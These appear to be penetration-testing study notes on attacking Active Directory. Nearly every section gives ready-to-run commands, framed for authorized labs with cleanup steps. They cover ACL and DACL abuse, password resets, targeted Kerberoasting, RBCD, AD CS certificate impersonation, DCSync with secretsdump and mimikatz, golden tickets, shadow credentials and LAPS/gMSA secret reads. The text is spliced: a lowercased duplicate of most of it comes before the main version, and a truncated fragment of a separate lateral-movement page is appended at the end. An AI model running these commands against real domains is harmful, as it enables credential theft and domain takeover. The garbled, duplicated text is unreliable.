sections.search:
## directory-object control

> **model:** controlled principal → effective ace → target object/type → permitted modification → authentication/authorization effect → cleanup.

enumerate a target's acl with resolved guids:

```powershell
import-module .\powerview.ps1
get-domainobjectacl -identity target_object -resolveguids |
  where-object { $_.activedirectoryrights -match 'genericall|genericwrite|writedacl|writeowner|extendedright' }
```

resolve trustees:

```powershell
convertfrom-sid 's-1-5-21-...'
get-domainobject -identity 's-1-5-21-...' | select-object samaccountname,objectclass
```

common effects require different rights:

| right/object | possible controlled effect | validation needed |
| --- | --- | --- |
| `genericall`/password-reset extended right on user | reset the user's password | effective trustee, account state, protected-object behavior |
| `genericall` or effective member-attribute write on group | add a controlled principal to the group | target group, nesting and a refreshed logon token |
| `genericwrite`/spn-property write on user | add a temporary spn, request a tgs and remove it | exact property right, duplicate-spn checks and cleanup |
| `writedacl` | grant a narrower right | ability to write dacl and restore original acl |
| `writeowner` | change owner, then possibly dacl | owner semantics and cleanup |
| computer-object write | rbcd-related attribute change | machine account/control, spn/kerberos and target service |

### password reset

a password-reset right creates a new password credential; it does not reveal the old one. this is disruptive because an unknown original password cannot be restored.

```powershell
$secure = convertto-securestring 'temp_password' -asplaintext -force
set-domainuserpassword -identity target_user -accountpassword $secure -verbose
net user target_user temp_password /domain
```

validate the account state and authenticate only to an approved service as the target identity. prefer a reversible route when one exists.

### group membership

```powershell
add-domaingroupmember -identity target_group -members controlled_user -verbose
get-domaingroupmember -identity target_group |
  where-object { $_.membername -eq 'controlled_user' }

# built-in alternative
net group target_group controlled_user /add /domain
```

a current session may not receive the new group sid until a fresh logon. validate with a new session/token, then remove the membership after the authorized objective:

```powershell
remove-domaingroupmember -identity target_group -members controlled_user -verbose -confirm:$false
net group target_group controlled_user /delete /domain
```

### targeted kerberoast through spn write

if the effective right permits writing `serviceprincipalname` on a user, add a unique temporary spn, request that account's ticket and remove the spn immediately. the cracking workflow is in [kerberos and identity transitions](03-kerberos-and-identity-transitions.md).

```powershell
setspn -s temp/target_user target_user
setspn -q temp/target_user
rubeus.exe kerberoast /user:target_user /outfile:target_user.tgs /format:hashcat
setspn -d temp/target_user target_user
```

### owner and dacl transitions

`writeowner` can make the controlled identity the owner; ownership may then permit a dacl change. `writedacl` can grant only the narrower right needed for the intended transition.

```powershell
set-domainobjectowner -identity target_object -owneridentity controlled_user -verbose
add-domainobjectacl -targetidentity target_object -principalidentity controlled_user -rights resetpassword -verbose

# group-membership variant
add-domainobjectacl -targetidentity target_group -principalidentity controlled_user -rights writemembers -verbose

# remove the ace after the authorized objective
remove-domainobjectacl -targetidentity target_object -principalidentity controlled_user -rights resetpassword -verbose
```

export the original owner/security descriptor before changing it and restore exactly that state. password resets, membership changes, spn writes, ownership changes and ace grants are state changes; do not execute merely because a graph shows an edge.

## conditional: gpo control

identify gpos and links:

```powershell
get-domaingpo
get-domainou | select-object name,distinguishedname,gplink
get-domainobjectacl -searchbase 'cn=policies,cn=system,dc=domain,dc=tld' -resolveguids |
  where-object { $_.activedirectoryrights -match 'genericall|genericwrite|writedacl|writeproperty' }
```

for a candidate, prove:

1. the controlled principal can edit both the directory object and relevant sysvol policy files;
2. the gpo is linked to the ou containing the intended test host/user;
3. security filtering and wmi filters include that subject;
4. the configured preference/task/script runs in the expected context; and
5. policy refresh or another predictable trigger will occur.

sharpgpoabuse supports immediate-task/local-group techniques, but syntax is version-sensitive and the action changes domain policy. inspect the installed build before a controlled lab action:

```cmd
sharpgpoabuse.exe --help
gpresult /r
gpupdate /force
```

back up the gpo, restrict the target/scope, document the exact change and restore it after validation.

## conditional: delegation paths

enumerate before attempting any ticket operation:

```powershell
get-domaincomputer -unconstrained | select-object dnshostname
get-domainuser -trustedtoauth | select-object samaccountname
get-domaincomputer -trustedtoauth | select-object dnshostname
get-domainobject -ldapfilter '(msds-allowedtodelegateto=*)' -properties samaccountname,msds-allowedtodelegateto
```

```bash
impacket-finddelegation 'domain/user:password' -dc-ip dc_ip
```

constrained delegation/s4u requires control of the delegated account/key and an allowed spn:

```bash
impacket-getst -spn allowed_spn -impersonate authorized_test_user \
  -dc-ip dc_ip 'domain/delegated_user:password'
export krb5ccname="$pwd/authorized_test_user.ccache"
```

use the ticket only for the approved service/host. unconstrained delegation can expose forwarded/cached tickets, but coercing authentication changes another host's behavior and is not a baseline. validate only in a disposable authorized lab and protect ticket material.

### resource-based constrained delegation

> **prerequisite:** effective write control over the target computer's `msds-allowedtoactonbehalfofotheridentity` plus control of a principal with an spn (often a lab computer account).

```bash
impacket-addcomputer 'domain/user:password' -computer-name 'labcomputer$' \
  -computer-pass 'lab_machine_password' -dc-host dc_host -dc-ip dc_ip

impacket-rbcd -delegate-from 'labcomputer$' -delegate-to 'targetcomputer$' \
  -action write -dc-ip dc_ip 'domain/user:password'

impacket-getst -spn cifs/target_host -impersonate authorized_test_user \
  -dc-ip dc_ip 'domain/labcomputer$:lab_machine_password'
```

cleanup after the lab objective:

```bash
impacket-rbcd -delegate-from 'labcomputer$' -delegate-to 'targetcomputer$' \
  -action remove -dc-ip dc_ip 'domain/user:password'
impacket-addcomputer 'domain/user:password' -computer-name 'labcomputer$' \
  -delete -dc-ip dc_ip
```

machine-account quota, computer-object rights, dns/spn naming and target service authorization are separate prerequisites.

## conditional: certificate request and authentication

generic request after validating a specific template:

```bash
certipy-ad req -u 'user@domain' -p 'password' -dc-ip dc_ip \
  -target dc_host -ca ca_name -template template
```

an alternate upn/sid request is appropriate only when the validated template permits it and the lab explicitly authorizes impersonation testing:

```bash
certipy-ad req -u 'user@domain' -p 'password' -dc-ip dc_ip \
  -target dc_host -ca ca_name -template template \
  -upn 'test_user@domain' -sid 'test_user_sid'
```

```bash
certipy-ad auth -pfx certificate.pfx -dc-ip dc_ip
```

## conditional: esc4/template-write boundary

before any authorized template change, save configuration:

```bash
certipy-ad template -u 'user@domain' -p 'password' -dc-ip dc_ip \
  -template template -save-configuration template-backup.json
```

## dcsync replication rights

> **prerequisite:** effective domain-root rights equivalent to `replicating directory changes` plus `replicating directory changes all` (and filtered-set rights where applicable). domain membership or local admin on an ordinary host is insufficient.

validate acls at the domain root:

```powershell
get-domainobjectacl -identity 'dc=domain,dc=tld' -resolveguids |
  where-object { $_.objectacetype -match 'replication-get-changes' }
```

a controlled dacl transition can grant these rights, but doing so changes the domain security descriptor and creates a domain-compromise path:

```powershell
add-domainobjectacl -targetidentity 'dc=domain,dc=tld' -principalidentity controlled_user -rights dcsync -verbose

# remove the delegated replication ace after the authorized objective
remove-domainobjectacl -targetidentity 'dc=domain,dc=tld' -principalidentity controlled_user -rights dcsync -verbose
```

local administrator rights on a member host, an ldap bind or a valid kerberos ticket do not supply replication rights. re-read the effective domain-root acl before and after a change.

request one approved test account rather than dumping the directory:

```bash
impacket-secretsdump -just-dc-user target_user -dc-ip dc_ip \
  'domain/user:password@dc_host'
```

mimikatz equivalent from an authorized windows context:

```text
lsadump::dcsync /domain:domain /user:target_user
```

> **decisive output:** selected directory secret material returned through replication. treat it as domain compromise evidence. stop, protect evidence, document the delegated right and move to remediation reasoning rather than broad collection.

## conditional: high-impact ticket-forging concepts

golden tickets require the domain sid and krbtgt key. they are persistence/impact concepts, not a default block 11 action. a forged ticket still depends on correct cryptographic material, realm, time and authorization. for the active service-scoped case, use [silver tickets](03-kerberos-and-identity-transitions.md#8-silver-tickets-forge-one-service-ticket).

authorized isolated-lab examples:

```bash
# golden: realm-wide tgt material
impacket-ticketer -nthash krbtgt_nt_hash -domain-sid domain_sid \
  -domain domain authorized_test_user

export krb5ccname="$pwd/authorized_test_user.ccache"
klist
```

use only against the approved service/host, record ticket metadata and remove generated credentials afterward. domain recovery after krbtgt exposure generally requires coordinated credential rotation and replication convergence; service-ticket exposure requires rotating the affected service/machine secret and reviewing access.

## bloodyad — linux-side ldap reads and permission-backed writes

use an authenticated ldap context and the exact right on the target object. start with a read. these writes are distinct alternatives selected by the observed acl:

```bash
# inspect the target/group instead of assuming the relationship
bloodyad --host dc_host -d domain -u user -p 'password' \
  get object target_object --attr distinguishedname,member,memberof

# force-change-password right on this specific account
bloodyad --host dc_host -d domain -u user -p 'password' \
  set password target_user 'new_password'

# write-members right on this specific group
bloodyad --host dc_host -d domain -u user -p 'password' \
  add groupmember target_group user
```

read: verify the actual attribute change and test the resulting identity/capability through a compatible service. group changes do not automatically refresh an existing process token/ticket. access denied → inspect the object dacl and protected-account context; authentication alone is insufficient. account operators membership does not imply control over protected administrator accounts/groups.

## delegated reads — laps and gmsa material

use when directory permissions grant access to the secret-bearing attribute. being able to enumerate the computer or service account does not grant that read.

```bash
# classic laps: password for the relevant computer's local administrator
bloodyad --host dc_host -d domain -u user -p 'password' \
  get object 'computer$' --attr ms-mcs-admpwd

# windows laps: returned content/format depends on schema and protection
bloodyad --host dc_host -d domain -u user -p 'password' \
  get object 'computer$' --attr mslaps-password

# gmsa: inspect the allowed managed-password attribute
bloodyad --host dc_host -d domain -u user -p 'password' \
  get object 'gmsa$' --attr msds-managedpassword
```

read: a laps value is scoped to the named host's local account. an encrypted windows-laps value still needs the permitted decryption context. a gmsa blob/base64 string is not automatically a directly reusable nt hash: parse/decode it with a compatible gmsa tool before choosing authentication. missing/denied attributes → distinguish schema, permissions and an empty value.

sources: [upstream 1](https://github.com/cravaterouge/bloodyad/wiki/user-guide) · [upstream 2](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview).

## shadow credentials — object-key write, pkinit, then cleanup

use only with effective write access to the target's `msds-keycredentiallink`, a dc supporting the required key-trust/pkinit behavior, correct time/dns and compatible certificates. inspect existing values first.

```bash
python3 pywhisker.py -d domain -u user -p 'password' --dc-ip dc_ip \
  --target target_user --action list

# adds a new key credential and generates certificate material; record its deviceid
python3 pywhisker.py -d domain -u user -p 'password' --dc-ip dc_ip \
  --target target_user --action add --filename target-key

# use the generated pfx password; request the target principal's tgt
python3 gettgtpkinit.py -cert-pfx target-key.pfx -pfx-pass 'pfx_password' \
  -dc-ip dc_ip domain/target_user target.ccache
export krb5ccname="$pwd/target.ccache"
klist

# optional nt-hash recovery from this pkinit tgt; key is the printed as-rep key
python3 getnthash.py -key as_rep_key -dc-ip dc_ip domain/target_user

# remove only the key credential you added; never clear unrelated original values
python3 pywhisker.py -d domain -u user -p 'password' --dc-ip dc_ip \
  --target target_user --action remove --device-id device_id
```

read: a successful attribute write does not yet establish a tgt or service authorization. verify the cached principal and the intended service. pkinit/certificate failure → inspect kdc support, mapping and trust; do not keep overwriting keys. preserve the original state and remove only your added deviceid after the test.

# Object Control, AD CS and Domain Compromise

[← Stage index](README.md) | [Domain mapping](01-domain-mapping.md) | [AD cheatsheet](../../cheatsheets/active-directory.md) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Map Active Directory attack paths](../../notes/methods/ad-mapping.md); [Gain a more useful domain identity](../../notes/methods/ad-identities.md)

> **Active Block 11 core:** user, group, SPN and DACL-backed identity transitions, plus the rights required for DCSync.
>
> **Conditional supplements:** GPO abuse, delegation/RBCD and AD CS remain evidence-led branches rather than core Block 11 study.

## Directory-object control

> **Model:** controlled principal → effective ACE → target object/type → permitted modification → authentication/authorization effect → cleanup.

Enumerate a target's ACL with resolved GUIDs:

```powershell
Import-Module .\PowerView.ps1
Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight' }
```

Resolve trustees:

```powershell
ConvertFrom-SID 'S-1-5-21-...'
Get-DomainObject -Identity 'S-1-5-21-...' | Select-Object samaccountname,objectclass
```

Common effects require different rights:

| Right/object | Possible controlled effect | Validation needed |
| --- | --- | --- |
| `GenericAll`/password-reset extended right on user | Reset the user's password | Effective trustee, account state, protected-object behavior |
| `GenericAll` or effective member-attribute write on group | Add a controlled principal to the group | Target group, nesting and a refreshed logon token |
| `GenericWrite`/SPN-property write on user | Add a temporary SPN, request a TGS and remove it | Exact property right, duplicate-SPN checks and cleanup |
| `WriteDacl` | Grant a narrower right | Ability to write DACL and restore original ACL |
| `WriteOwner` | Change owner, then possibly DACL | Owner semantics and cleanup |
| Computer-object write | RBCD-related attribute change | Machine account/control, SPN/Kerberos and target service |

### Password reset

A password-reset right creates a new password credential; it does not reveal the old one. This is disruptive because an unknown original password cannot be restored.

```powershell
$Secure = ConvertTo-SecureString 'TEMP_PASSWORD' -AsPlainText -Force
Set-DomainUserPassword -Identity TARGET_USER -AccountPassword $Secure -Verbose
net user TARGET_USER TEMP_PASSWORD /domain
```

Validate the account state and authenticate only to an approved service as the target identity. Prefer a reversible route when one exists.

### Group membership

```powershell
Add-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose
Get-DomainGroupMember -Identity TARGET_GROUP |
  Where-Object { $_.MemberName -eq 'CONTROLLED_USER' }

# Built-in alternative
net group TARGET_GROUP CONTROLLED_USER /add /domain
```

A current session may not receive the new group SID until a fresh logon. Validate with a new session/token, then remove the membership after the authorized objective:

```powershell
Remove-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose -Confirm:$false
net group TARGET_GROUP CONTROLLED_USER /delete /domain
```

### Targeted Kerberoast through SPN write

If the effective right permits writing `servicePrincipalName` on a user, add a unique temporary SPN, request that account's ticket and remove the SPN immediately. The cracking workflow is in [Kerberos and identity transitions](03-kerberos-and-identity-transitions.md).

```powershell
setspn -S TEMP/TARGET_USER TARGET_USER
setspn -Q TEMP/TARGET_USER
Rubeus.exe kerberoast /user:TARGET_USER /outfile:TARGET_USER.tgs /format:hashcat
setspn -D TEMP/TARGET_USER TARGET_USER
```

### Owner and DACL transitions

`WriteOwner` can make the controlled identity the owner; ownership may then permit a DACL change. `WriteDacl` can grant only the narrower right needed for the intended transition.

```powershell
Set-DomainObjectOwner -Identity TARGET_OBJECT -OwnerIdentity CONTROLLED_USER -Verbose
Add-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose

# Group-membership variant
Add-DomainObjectAcl -TargetIdentity TARGET_GROUP -PrincipalIdentity CONTROLLED_USER -Rights WriteMembers -Verbose

# Remove the ACE after the authorized objective
Remove-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose
```

Export the original owner/security descriptor before changing it and restore exactly that state. Password resets, membership changes, SPN writes, ownership changes and ACE grants are state changes; do not execute merely because a graph shows an edge.

## Conditional: GPO control

Identify GPOs and links:

```powershell
Get-DomainGPO
Get-DomainOU | Select-Object name,distinguishedname,gplink
Get-DomainObjectAcl -SearchBase 'CN=Policies,CN=System,DC=DOMAIN,DC=TLD' -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteProperty' }
```

For a candidate, prove:

1. the controlled principal can edit both the directory object and relevant SYSVOL policy files;
2. the GPO is linked to the OU containing the intended test host/user;
3. security filtering and WMI filters include that subject;
4. the configured preference/task/script runs in the expected context; and
5. policy refresh or another predictable trigger will occur.

SharpGPOAbuse supports immediate-task/local-group techniques, but syntax is version-sensitive and the action changes domain policy. Inspect the installed build before a controlled lab action:

```cmd
SharpGPOAbuse.exe --help
gpresult /r
gpupdate /force
```

Back up the GPO, restrict the target/scope, document the exact change and restore it after validation.

## Conditional: delegation paths

Enumerate before attempting any ticket operation:

```powershell
Get-DomainComputer -Unconstrained | Select-Object dnshostname
Get-DomainUser -TrustedToAuth | Select-Object samaccountname
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname
Get-DomainObject -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties samaccountname,msds-allowedtodelegateto
```

```bash
impacket-findDelegation 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP
```

Constrained delegation/S4U requires control of the delegated account/key and an allowed SPN:

```bash
impacket-getST -spn ALLOWED_SPN -impersonate AUTHORIZED_TEST_USER \
  -dc-ip DC_IP 'DOMAIN/DELEGATED_USER:PASSWORD'
export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache"
```

Use the ticket only for the approved service/host. Unconstrained delegation can expose forwarded/cached tickets, but coercing authentication changes another host's behavior and is not a baseline. Validate only in a disposable authorized lab and protect ticket material.

### Resource-based constrained delegation

> **Prerequisite:** effective write control over the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` plus control of a principal with an SPN (often a lab computer account).

```bash
impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \
  -computer-pass 'LAB_MACHINE_PASSWORD' -dc-host DC_HOST -dc-ip DC_IP

impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \
  -action write -dc-ip DC_IP 'DOMAIN/USER:PASSWORD'

impacket-getST -spn cifs/TARGET_HOST -impersonate AUTHORIZED_TEST_USER \
  -dc-ip DC_IP 'DOMAIN/LABCOMPUTER$:LAB_MACHINE_PASSWORD'
```

Cleanup after the lab objective:

```bash
impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \
  -action remove -dc-ip DC_IP 'DOMAIN/USER:PASSWORD'
impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \
  -delete -dc-ip DC_IP
```

Machine-account quota, computer-object rights, DNS/SPN naming and target service authorization are separate prerequisites.

## Conditional: AD CS enumeration

> **Prerequisite:** reachable CA/DC and a valid domain identity. **Decisive output:** a CA/template whose enabled state, enrollment rights and configuration satisfy a specific ESC path.

Package names vary:

```bash
command -v certipy-ad || command -v certipy
certipy-ad find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
  -enabled -vulnerable -stdout
```

Review:

- CA name and host;
- template name and whether it is enabled/published;
- who can enroll;
- client-authentication EKUs/purpose;
- subject/SAN supply controls;
- manager approval/signature requirements;
- template owner and modification rights;
- web enrollment/relay-related configuration where relevant.

An `ESC` label is a candidate classification. Manually validate the properties and the controlled identity's effective rights.

## Conditional: certificate request and authentication

Generic request after validating a specific template:

```bash
certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
  -target DC_HOST -ca CA_NAME -template TEMPLATE
```

An alternate UPN/SID request is appropriate only when the validated template permits it and the lab explicitly authorizes impersonation testing:

```bash
certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
  -target DC_HOST -ca CA_NAME -template TEMPLATE \
  -upn 'TEST_USER@DOMAIN' -sid 'TEST_USER_SID'
```

```bash
certipy-ad auth -pfx CERTIFICATE.pfx -dc-ip DC_IP
```

Treat PFX files, tickets and returned hashes as credentials. Verify certificate subject/SID, validity and intended identity. A successful issuance is not the same as successful PKINIT authentication.

## Conditional: ESC4/template-write boundary

Before any authorized template change, save configuration:

```bash
certipy-ad template -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \
  -template TEMPLATE -save-configuration template-backup.json
```

Template writes alter Active Directory configuration and may affect many principals. Use only an explicitly authorized disposable lab path, inspect `certipy-ad template -h` for the installed version, and restore the saved configuration after the demonstration.

## DCSync replication rights

> **Prerequisite:** effective domain-root rights equivalent to `Replicating Directory Changes` plus `Replicating Directory Changes All` (and filtered-set rights where applicable). Domain membership or local admin on an ordinary host is insufficient.

Validate ACLs at the domain root:

```powershell
Get-DomainObjectAcl -Identity 'DC=DOMAIN,DC=TLD' -ResolveGUIDs |
  Where-Object { $_.ObjectAceType -match 'Replication-Get-Changes' }
```

A controlled DACL transition can grant these rights, but doing so changes the domain security descriptor and creates a domain-compromise path:

```powershell
Add-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose

# Remove the delegated replication ACE after the authorized objective
Remove-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose
```

Local administrator rights on a member host, an LDAP bind or a valid Kerberos ticket do not supply replication rights. Re-read the effective domain-root ACL before and after a change.

Request one approved test account rather than dumping the directory:

```bash
impacket-secretsdump -just-dc-user TARGET_USER -dc-ip DC_IP \
  'DOMAIN/USER:PASSWORD@DC_HOST'
```

Mimikatz equivalent from an authorized Windows context:

```text
lsadump::dcsync /domain:DOMAIN /user:TARGET_USER
```

> **Decisive output:** selected directory secret material returned through replication. Treat it as domain compromise evidence. Stop, protect evidence, document the delegated right and move to remediation reasoning rather than broad collection.

## Conditional: high-impact ticket-forging concepts

Golden tickets require the domain SID and KRBTGT key. They are persistence/impact concepts, not a default Block 11 action. A forged ticket still depends on correct cryptographic material, realm, time and authorization. For the active service-scoped case, use [Silver tickets](03-kerberos-and-identity-transitions.md#8-silver-tickets-forge-one-service-ticket).

Authorized isolated-lab examples:

```bash
# Golden: realm-wide TGT material
impacket-ticketer -nthash KRBTGT_NT_HASH -domain-sid DOMAIN_SID \
  -domain DOMAIN AUTHORIZED_TEST_USER

export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache"
klist
```

Use only against the approved service/host, record ticket metadata and remove generated credentials afterward. Domain recovery after KRBTGT exposure generally requires coordinated credential rotation and replication convergence; service-ticket exposure requires rotating the affected service/machine secret and reviewing access.

## bloodyAD — Linux-side LDAP reads and permission-backed writes

Use an authenticated LDAP context and the exact right on the target object. Start with a read. These writes are distinct alternatives selected by the observed ACL:

```bash
# Inspect the target/group instead of assuming the relationship
bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
  get object TARGET_OBJECT --attr distinguishedName,member,memberOf

# Force-change-password right on this specific account
bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
  set password TARGET_USER 'NEW_PASSWORD'

# Write-members right on this specific group
bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
  add groupMember TARGET_GROUP USER
```

Read: verify the actual attribute change and test the resulting identity/capability through a compatible service. Group changes do not automatically refresh an existing process token/ticket. Access denied → inspect the object DACL and protected-account context; authentication alone is insufficient. Account Operators membership does not imply control over protected administrator accounts/groups.

Sources: [upstream 1](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide).


## Delegated reads — LAPS and gMSA material

Use when directory permissions grant access to the secret-bearing attribute. Being able to enumerate the computer or service account does not grant that read.

```bash
# Classic LAPS: password for the relevant computer's local administrator
bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
  get object 'COMPUTER$' --attr ms-Mcs-AdmPwd

# Windows LAPS: returned content/format depends on schema and protection
bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
  get object 'COMPUTER$' --attr msLAPS-Password

# gMSA: inspect the allowed managed-password attribute
bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
  get object 'GMSA$' --attr msDS-ManagedPassword
```

Read: a LAPS value is scoped to the named host's local account. An encrypted Windows-LAPS value still needs the permitted decryption context. A gMSA blob/base64 string is not automatically a directly reusable NT hash: parse/decode it with a compatible gMSA tool before choosing authentication. Missing/denied attributes → distinguish schema, permissions and an empty value.

Sources: [upstream 1](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide) · [upstream 2](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview).


## Shadow credentials — object-key write, PKINIT, then cleanup

Use only with effective write access to the target's `msDS-KeyCredentialLink`, a DC supporting the required key-trust/PKINIT behavior, correct time/DNS and compatible certificates. Inspect existing values first.

```bash
python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \
  --target TARGET_USER --action list

# Adds a new key credential and generates certificate material; record its DeviceID
python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \
  --target TARGET_USER --action add --filename target-key

# Use the generated PFX password; request the target principal's TGT
python3 gettgtpkinit.py -cert-pfx target-key.pfx -pfx-pass 'PFX_PASSWORD' \
  -dc-ip DC_IP DOMAIN/TARGET_USER target.ccache
export KRB5CCNAME="$PWD/target.ccache"
klist

# Optional NT-hash recovery from this PKINIT TGT; key is the printed AS-REP key
python3 getnthash.py -key AS_REP_KEY -dc-ip DC_IP DOMAIN/TARGET_USER

# Remove only the key credential you added; never clear unrelated original values
python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \
  --target TARGET_USER --action remove --device-id DEVICE_ID
```

Read: a successful attribute write does not yet establish a TGT or service authorization. Verify the cached principal and the intended service. PKINIT/certificate failure → inspect KDC support, mapping and trust; do not keep overwriting keys. Preserve the original state and remove only your added DeviceID after the test.

Sources: [upstream 1](https://github.com/ShutdownRepo/pywhisker) · [upstream 2](https://github.com/dirkjanm/PKINITtools).


## PassTheCert — Schannel/LDAP when the certificate is usable there

Use a certificate/private key mapped to an accepted AD identity with the necessary trust/EKU and a working LDAP TLS path. PKINIT and Schannel are different authentication paths: failure of one does not prove the other works or fails.

```bash
# Extract PEM material from the relevant PFX; respond to password prompts
openssl pkcs12 -in USER.pfx -clcerts -nokeys -out USER.crt
openssl pkcs12 -in USER.pfx -nocerts -nodes -out USER.key

# First identify the principal accepted through the certificate
python3 passthecert.py -action whoami -crt USER.crt -key USER.key \
  -domain DOMAIN -dc-host DC_HOST -dc-ip DC_IP

# Inspect operations in the LDAP shell before choosing an authorized write
python3 passthecert.py -action ldap-shell -crt USER.crt -key USER.key \
  -domain DOMAIN -dc-host DC_HOST -dc-ip DC_IP
```

Read: successful binding proves that mapped identity's LDAP context, not domain administration. The same object ACL still governs group/password/delegation writes. Certificate trust/mapping, TLS policy or a missing private key can block this route. Do not weaken workstation-wide TLS settings to compensate for an unexplained failure.

Sources: [upstream 1](https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/README.md).


## Powermad — create an account only when the chosen AD path needs it

Use from a suitable authenticated PowerShell context when the actual quota/delegation permits computer creation and the planned path needs an account/SPN you control. Account creation alone does not grant RBCD rights on another host.

```powershell
Import-Module .\Powermad.ps1
$machinePassword = ConvertTo-SecureString 'MACHINE_PASSWORD' -AsPlainText -Force
New-MachineAccount -MachineAccount NEWPC -Password $machinePassword `
  -Domain DOMAIN -DomainController DC_HOST
```

Read: verify the created account, its SPNs and the chosen target-object permission separately. Quota, OU ACLs and existing names can stop the operation. Standard create rights do not necessarily permit deleting the created account later; establish the cleanup route and avoid repeated throwaway account creation.

Sources: [upstream 1](https://github.com/Kevin-Robertson/Powermad).


## gMSA — obtain a decoded hash only with managed-password read rights

Use when the accepted directory identity has the managed-password read permission for the gMSA. NetExec selects LDAPS for this operation, so the DC's LDAP TLS path must work.

```bash
nxc ldap DC_IP -d DOMAIN -u USER -p 'PASSWORD' --gmsa

# After identifying the returned service account and hash, test one relevant service
nxc smb TARGET -d DOMAIN -u 'GMSA$' -H HASH --shares
```

Read: keep the exact service-account name and decoded NT hash together; an encoded `msDS-ManagedPassword` blob is a different representation. Authentication acceptance still does not prove administrative/remote-execution rights. Empty output → inspect object permissions, LDAPS, account type and collection errors before concluding that no gMSA path exists.

Sources: [upstream 1](https://www.netexec.wiki/ldap-protocol/dump-gmsa).


## Sources

- Supplied PEN-200, Chapter 23, especially the targeted Kerberoast, silver-ticket and DCSync sections.
- [OffSec OSCP+ Body of Knowledge](https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge)
- [PowerSploit PowerView (archived)](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
- [getSH Active Directory: Object Permissions, AD CS, GPO Abuse and Domain Compromise](https://lizajose.github.io/getSH/ad), source snapshot [`e1f62dd`](https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98)
- [Certipy](https://github.com/ly4k/Certipy)
- [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- [SpecterOps AD CS research](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [Hexdump Active Directory modules](https://github.com/LeonardoE95/OSCP/tree/main/modules/active-directory)

# lateral movement [← stage index](readme.md) | [identity transitions](03-kerberos-and-identity-transitions.md) | [pivoting](../07-pivoting-tunneling/readme.md) | [ad cheatsheet](../../cheatsheets/active-directory.md) | [strategy map](../../notes/attack_strategy_map.md) | study methods: [move to another host](../../notes/methods/lateral-movement.md) > **selection rule:** credential type → accepted authentication protocol → reachable service → service-specific authorization → execution/session effect. > > **exit:** verify the destination hostname, represented identity, token/rights and network state; then re-enumerate credentials, domain relationships, sessions and routes. ## 1. choose by credential and service | material | compatible starting paths | important boundary | | --- | --- | --- | | password | smb/scm, wmi/dcom, winrm/winrs, rdp | correct password does not grant the required logon or execution right | | nt hash | ntlm-capable smb/wmi/winrm; rdp only through restricted admin where supported | net-ntlm and dcc2 are not reusable nt hashes | | tgt/ccache | kerberos-capable tool using target fqdn/spn | ticket identity, realm, lifetime, dns and kdc route must match | | tgs | only the named `service/host` and compatible client | a cifs ticket does not authorize winrm, wmi or rdp | | aes/nt long-term key | request a tgt, then use kerberos | rc4/nt-key requests can fail where rc4 is disabled | | local-account password/hash | ntlm or rdp in the target's local account context | remote uac/account restrictions commonly filter non-rid-500 local administrators | | reachable service | common execution/access mechanisms | usual authorization | | --- | --- | --- | | smb 445 + scm/rpc | psexec, smbexec, service creation | administrative share plus scm/service rights | | rpc endpoint mapper 135 + dynamic rpc; often smb for output | wmiexec, native cim/wmi, dcom | remote wmi/dcom rights, commonly an effective administrator token | | task scheduler rpc plus smb output | atexec | remote task creation and administrative output access | | winrm 5985/5986 | winrs, powershell remoting, evil-winrm | enabled endpoint and endpoint/session authorization | | rdp 3389 | freerdp, mstsc | remote-interactive logon right; restricted admin requires administrator access | ## 2. preflight from the actual source directly routed 